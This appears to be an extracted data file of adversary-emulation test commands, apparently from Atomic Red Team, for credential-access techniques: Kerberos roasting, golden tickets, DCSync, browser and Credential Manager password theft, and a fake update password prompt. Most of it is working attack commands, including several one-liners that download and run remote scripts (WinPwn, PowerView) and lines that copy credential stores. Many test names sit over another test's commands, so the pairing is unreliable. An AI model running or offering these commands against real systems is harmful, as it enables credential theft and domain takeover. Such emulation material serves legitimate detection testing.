1: [- name: Rubeus asreproast] [attack_technique: T1558.004] [    command: |]
2: [- name: Rubeus asreproast] [attack_technique: T1558.004] [      cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"]
7: [- name: Get-DomainUser with PowerView] [attack_technique: T1558.004] [    command: |]
8: [- name: Get-DomainUser with PowerView] [attack_technique: T1558.004] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
9: [- name: Get-DomainUser with PowerView] [attack_technique: T1558.004] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose]
17: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [    command: |]
18: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [      mavinject $pid /INJECTRUNNING #{file_name}]
19: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [      Invoke-WebRequest #{server_name} -UseBasicParsing]
22: [- name: Extracting passwords with findstr] [attack_technique: T1552.001] [    command: |]
23: [- name: Extracting passwords with findstr] [attack_technique: T1552.001] [      findstr /si pass *.xml *.doc *.txt *.xls]
24: [- name: Extracting passwords with findstr] [attack_technique: T1552.001] [      ls -R | select-string -Pattern password]
27: [- name: Access unattend.xml] [attack_technique: T1552.001] [    command: |]
28: [- name: Access unattend.xml] [attack_technique: T1552.001] [      type C:\Windows\Panther\unattend.xml]
29: [- name: Access unattend.xml] [attack_technique: T1552.001] [      type C:\Windows\Panther\Unattend\unattend.xml]
82: [- name: Extract Windows Credential Manager via VBA] [attack_technique: T1555] [    command: |]
83: [- name: Extract Windows Credential Manager via VBA] [attack_technique: T1555] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
84: [- name: Extract Windows Credential Manager via VBA] [attack_technique: T1555] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
85: [- name: Extract Windows Credential Manager via VBA] [attack_technique: T1555] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"]
90: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [    command: |]
91: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [      IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   ]
92: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [  auto_generated_guid: 8fd5a296-6772-4766-9991-ff4e92af7240]
93: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [  supported_platforms:]
94: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [  - windows]
95: [- name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]] [attack_technique: T1555] [  executor:]
98: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] ] [attack_technique: T1555] [    command: |]
99: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] ] [attack_technique: T1555] [      IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force]
100: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] ] [attack_technique: T1555] [  auto_generated_guid: 36753ded-e5c4-4eb5-bc3c-e8fba236878d]
101: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] ] [attack_technique: T1555] [  - windows]
102: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] ] [attack_technique: T1555] [  executor:]
105: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]] [attack_technique: T1555] [    command: |]
106: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]] [attack_technique: T1555] [      vaultcmd /listcreds:"Windows Credentials" /all]
107: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]] [attack_technique: T1555] [  auto_generated_guid: bc071188-459f-44d5-901a-f8f2625b2d2e]
108: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]] [attack_technique: T1555] [  - windows]
109: [- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]] [attack_technique: T1555] [  executor:]
112: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [    command: |]
113: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [      vaultcmd /listcreds:"Web Credentials" /all]
114: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [  auto_generated_guid: 079ee2e9-6f16-47ca-a635-14efcd994118]
115: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [  - windows]
116: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [  executor:]
117: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [    command: |-]
118: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t']
119: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')]
120: [- name: WinPwn - Loot local Credentials - lazagne] [attack_technique: T1555] [      lazagnemodule -consoleoutput -noninteractive]
135: [- name: Run Chrome-password Collector] [attack_technique: T1555.003] [    command: |]
136: [- name: Run Chrome-password Collector] [attack_technique: T1555.003] [      Set-Location -path "#{file_path}\Sysinternals";]
137: [- name: Run Chrome-password Collector] [attack_technique: T1555.003] [      ./accesschk.exe -accepteula .;]
142: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [    command: |]
143: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      #{lazagne_path} browsers]
144: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  auto_generated_guid: 3d111226-d09a-4911-8715-fe11664f960d]
145: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [    Simulates an adversary accessing encrypted credentials from Google Chrome Login database. ]
146: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  supported_platforms:]
147: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [    - windows]
148: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  dependency_executor_name: powershell]
149: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  dependencies:]
150: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  - description: |]
151: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      Chrome must be installed]
152: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}']
153: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [    get_prereq_command: | ]
154: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      $installer = "$env:temp\ChromeStandaloneSetup64.msi"]
155: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi]
156: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      msiexec /i $installer /qn]
157: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      Start-Process -FilePath "chrome.exe"]
158: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [      Stop-Process -Name "chrome"]
159: [- name: Simulating access to Chrome Login Data] [attack_technique: T1555.003] [  executor:]
162: [- name: Simulating access to Opera Login Data] [attack_technique: T1555.003] [    command: |]
163: [- name: Simulating access to Opera Login Data] [attack_technique: T1555.003] [      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination $env:temp]
164: [- name: Simulating access to Opera Login Data] [attack_technique: T1555.003] [      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination $env:temp]
189: [- name: Simulating access to Windows Firefox Login Data] [attack_technique: T1555.003] [    command: |]
190: [- name: Simulating access to Windows Firefox Login Data] [attack_technique: T1555.003] [      Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination $env:temp]
217: [- name: Simulating access to Windows Edge Login Data] [attack_technique: T1555.003] [    command: |]
218: [- name: Simulating access to Windows Edge Login Data] [attack_technique: T1555.003] [      Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination $env:temp -Force -Recurse]
241: [- name: Decrypt Mozilla Passwords with Firepwd.py] [attack_technique: T1555.003] [    command: |]
242: [- name: Decrypt Mozilla Passwords with Firepwd.py] [attack_technique: T1555.003] [      Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination $env:temp\Edge -Force -Recurse]
322: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [    command: |]
323: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     $exfil_folder = "$env:temp\T1555.003"]
324: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}]
325: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"]
326: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}]
327: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}]
328: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {}]
329: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}]
330: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {}]
331: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} ]
332: [- name: WinPwn - BrowserPwn] [attack_technique: T1555.003] [     compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force]
359: [- name: Enumeration for Credentials in Registry] [attack_technique: T1552.002] [    command: |]
360: [- name: Enumeration for Credentials in Registry] [attack_technique: T1552.002] [      reg query HKLM /f password /t REG_SZ /s]
361: [- name: Enumeration for Credentials in Registry] [attack_technique: T1552.002] [      reg query HKCU /f password /t REG_SZ /s]
364: [- name: Enumeration for PuTTY Credentials in Registry] [attack_technique: T1552.002] [    command: |]
365: [- name: Enumeration for PuTTY Credentials in Registry] [attack_technique: T1552.002] [      reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s]
368: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    command: |]
369: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      #{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"]
370: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] []
371: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e]
372: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    The following Atomic will run Get-ADReplAccount from DSInternals.]
373: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    Upon successful execution, domain and credentials will appear in stdout. ]
374: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    [Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.]
375: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/]
376: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  supported_platforms:]
377: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  - windows]
378: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  input_arguments:]
379: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    logonserver:]
380: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      type: String]
381: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      default: $ENV:logonserver.TrimStart("\")]
382: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  dependency_executor_name: powershell]
383: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  dependencies:]
384: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  - description: |]
385: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      DSInternals must be installed]
386: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    prereq_command: |]
387: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      $RequiredModule = Get-Module -Name DSInternals -ListAvailable]
388: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      if (-not $RequiredModule) {exit 1}]
389: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}]
390: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    get_prereq_command: |]
391: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      Install-Module -Name DSInternals -Scope CurrentUser -Force]
392: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [  executor:]
393: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [    command: |]
394: [- name: Run DSInternals Get-ADReplAccount] [attack_technique: T1003.006] [      Get-ADReplAccount -All -Server #{logonserver}]
397: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [    command: |]
398: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [      & "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}]
399: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [      Write-Host "End of PetitPotam attack"]
400: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [  auto_generated_guid: 7f06b25c-799e-40f1-89db-999c9cc84317]
401: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [  supported_platforms:]
402: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [  - windows]
403: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [  executor:]
404: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [    command: |-]
405: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')]
406: [- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS] [attack_technique: T1187] [      Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"]
409: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [    command: |]
410: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      # Creates GUI to prompt for password. Expect long pause before prompt is available.    ]
411: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)]
412: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      # Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.]
413: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      write-warning $cred.GetNetworkCredential().Password]
416: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    command: |]
417: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore]
418: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore]
419: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
420: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # get current domain SID if default was used]
421: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      $domain_sid = "#{domain_sid}"]
422: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      If ($domain_sid -Match "DEFAULT") {]
423: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60]
424: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        $domain = gwmi Win32_ComputerSystem | Select -Expand Domain]
425: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value]
426: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))]
427: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      }]
428: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
429: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # create batch file with commands to run in a separate "runas /netonly" session]
430: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # so we don't purge Kerberos ticket from the current Windows session]
431: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise]
432: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      @"]
433: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      >%TEMP%\golden.txt 2>&1 (]
434: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo Purge existing tickets and create golden ticket:]
435: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        klist purge]
436: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"]
437: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
438: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo.]
439: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo Requesting SYSVOL:]
440: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        dir \\#{domain}\SYSVOL]
441: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        ]
442: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo.]
443: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo Tickets after requesting SYSVOL:]
444: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        klist]
445: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
446: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo.]
447: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        echo End of Golden Ticket attack]
448: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      )]
449: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat]
450: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      ]
451: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # run batch file in a new empty session (password and username do not matter)]
452: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null]
453: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      ]
454: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # wait until the output file has logged the entire attack]
455: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      do {]
456: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        Start-Sleep 1 # wait a bit so the output file has time to be created]
457: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {]
458: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [          if ($_ -match 'End of Golden Ticket attack') { break } ]
459: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [        }]
460: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      } while ($false) # dummy loop so that 'break' can be used]
461: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
462: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # show output from new empty session]
463: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Get-Content $env:TEMP\golden.txt]
464: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
465: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      # cleanup temp files]
466: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore]
467: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore]
468: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] []
469: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  auto_generated_guid: e42d33cd-205c-4acf-ab59-a9f38f6bad9c]
470: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.]
471: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).]
472: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.]
473: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  supported_platforms:]
474: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    - windows]
475: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  input_arguments:]
476: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    domaincontroller:]
477: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: String]
478: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default:  $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"]
479: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    account:]
480: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: String]
481: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default: $ENV:username]
482: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    krbtgt_aes256_key:]
483: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: String]
484: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9]
485: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    local_folder:]
486: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: Path]
487: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default: $Env:temp]
488: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    local_executable:]
489: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: String]
490: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default: 'rubeus.exe']
491: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    rubeus_url:]
492: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      type: Url]
493: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe]
494: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  dependency_executor_name: powershell]
495: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  dependencies:]
496: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  - description: |]
497: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Computer must be domain joined]
498: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    prereq_command: |]
499: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}]
500: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    get_prereq_command: |]
501: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Write-Host Joining this computer to a domain must be done manually]
502: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  - description: |]
503: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Rubeus must exist]
504: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    prereq_command: |]
505: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      if(Test-Path -Path #{local_folder}\#{local_executable}) {exit 0} else {exit 1}]
506: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [    get_prereq_command: |]
507: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [      Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}]
508: [- name: Crafting Active Directory golden tickets with Rubeus] [attack_technique: T1558.001] [  executor:]
511: [- name: GPP Passwords (findstr)] [attack_technique: T1552.006] [    command: |]
512: [- name: GPP Passwords (findstr)] [attack_technique: T1552.006] [      findstr /S cpassword %logonserver%\sysvol\*.xml]
515: [- name: GPP Passwords (Get-GPPPassword)] [attack_technique: T1552.006] [    command: |]
516: [- name: GPP Passwords (Get-GPPPassword)] [attack_technique: T1552.006] [      . #{gpp_script_path}]
517: [- name: GPP Passwords (Get-GPPPassword)] [attack_technique: T1552.006] [      Get-GPPPassword -Verbose]
520: [- name: Request for service tickets] [attack_technique: T1558.003] [    command: |]
